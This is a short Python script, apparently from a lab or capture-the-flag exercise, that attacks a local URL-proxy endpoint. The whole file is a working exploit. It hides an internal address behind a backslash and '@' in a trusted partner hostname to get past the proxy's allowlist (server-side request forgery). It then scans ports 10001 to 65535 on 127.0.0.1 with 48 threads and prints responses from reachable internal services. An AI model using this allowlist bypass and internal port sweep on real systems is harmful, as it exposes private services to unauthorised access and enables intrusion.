import requests, concurrent.futures as cf, sys
P="http://127.0.0.1:24606/api/proxy"
def probe(p):
    u=f"http://rates.partner-forex.example.com\\@127.0.0.1:{p}/"
    for attempt in range(2):
        try:
            r=requests.get(P, params={"url":u}, timeout=6)
            if "upstream unreachable" not in r.text:
                return (p, r.status_code, r.text[:100].replace("\n"," "))
            return None
        except Exception as e:
            if attempt==1:
                return (p,"TIMEOUT/EXC",type(e).__name__)
    return None
res=[]
with cf.ThreadPoolExecutor(max_workers=48) as ex:
    futs={ex.submit(probe,p):p for p in range(10001,65536)}
    done=0
    for f in cf.as_completed(futs):
        done+=1
        o=f.result()
        if o:
            res.append(o); print(o, flush=True)
        if done%5000==0:
            print(f"-- progress {done}", flush=True)
print("DONE", res, flush=True)
